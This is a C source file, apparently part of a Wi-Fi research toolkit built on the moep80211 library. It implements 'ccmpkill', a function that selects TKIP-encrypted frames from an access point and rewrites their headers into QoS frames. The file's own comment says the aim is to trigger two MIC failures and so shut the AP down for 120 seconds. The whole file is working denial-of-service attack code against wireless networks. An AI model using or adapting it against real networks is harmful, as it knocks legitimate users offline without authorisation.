#include <stdio.h>
#include <string.h>
#include <endian.h>

#include <moep80211/modules/ieee80211.h>
#include <moepcommon/util.h>

#include "michael.h"
#include "../global.h"
#include "../helper.h"
#include "../radiotap.h"


/*
 * We try to disable an AP for 120s by causing 2 MIC failures within 60s. This
 * should work in all networks using TKIP as group cipher, i.e., even if the
 * pairwise cipher is CCMP. This is commonly the case when a BSS supports both
 * CCMP and TKIP.
 * It is not necessary that QoS es enabled on the AP. We need QoS frames, but
 * we can make any frame look like a QoS frame by tampering with its heder.
 * Since IEEE802.11 demands that QoS frames are accepted even if it is not
 * enabled, our frame should pass.
 * In addition, we do not need to correct the ICV since we do not tamper with
 * the frame's payload. The header is not protected by the ICV, only the MIC.
 * And we want the latter to fail.
 */

moep_frame_t
ccmpkill(moep_frame_t frame)
{
	size_t len;
	struct ieee80211_hdr_gen *hdr;
	struct ieee80211_encryption_hdr *enc_hdr;
	struct moep80211_radiotap *rt;

	// encryption header should follow directly to the generic header
	enc_hdr = (struct ieee80211_encryption_hdr *)
				moep_frame_get_payload(frame, &len);
	if (len < sizeof(struct ieee80211_encryption_hdr))
		return NULL; // cannot be a valid encryption header

	hdr = moep_frame_ieee80211_hdr(frame);

	// double-check that the frame is valid and TKIP-encrypted
	if (!ieee80211_is_data(hdr->frame_control))
		return NULL;
	if (!ieee80211_has_protected(hdr->frame_control))
		return NULL; // not encrypted at all
	if (!enc_hdr->ext_iv)
		return NULL; // WEP frame
	if (enc_hdr->tsc0 == 0)
		return NULL; // CCMP frame

	// frame must be from the AP, as the client still sends it CCMP
	// encrypted to the AP
	if (!(ieee80211_has_fromds(hdr->frame_control)
		&& !ieee80211_has_tods(hdr->frame_control)))
		return NULL;

	fprintf(stdout, "got suitable TKIP encrypted frame from %s to %s\n",
			mac_ntoa(hdr->addr2), mac_ntoa(hdr->addr1));

	// make it look like a QoS frame
	hdr->frame_control &= htole16(~IEEE80211_STYPE_DATA);
	hdr->frame_control |=  htole16(IEEE80211_STYPE_QOS_DATA);
	hdr->qos_ctrl = 0x0007;

	// init radiotap header to defaults
	rt = moep_frame_radiotap(frame);
	radiotap_set_defaults(rt);

	return frame;
}

